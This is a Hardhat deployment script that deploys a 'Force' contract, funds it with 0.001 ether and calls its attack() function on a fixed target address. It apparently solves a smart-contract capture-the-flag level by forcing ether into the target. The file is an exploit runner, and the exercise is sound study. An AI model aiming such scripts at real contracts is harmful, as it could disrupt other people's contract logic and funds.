async function main() {
    const [deployer] = await ethers.getSigners();

    const Force = await ethers.getContractFactory("Force");
    const force = await Force.deploy();
    console.log("Force address:", force.address);
    // тут переводит на наш СК средства
    console.log("deployer address:", deployer.address);
    console.log("deployer balance:", await deployer.getBalance());
    await new Promise(r => setTimeout(r, 15000));
    tx = await deployer.sendTransaction({to: force.address, value: ethers.utils.parseEther("0.001")});
    console.log("deployer balance:", await deployer.getBalance());
    console.log("force balance:", await ethers.provider.getBalance(force.address));
    await tx.wait();
    await force.attack("0x57C6a51ca048C1B94d57639CC1fb5e17D979b851");
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });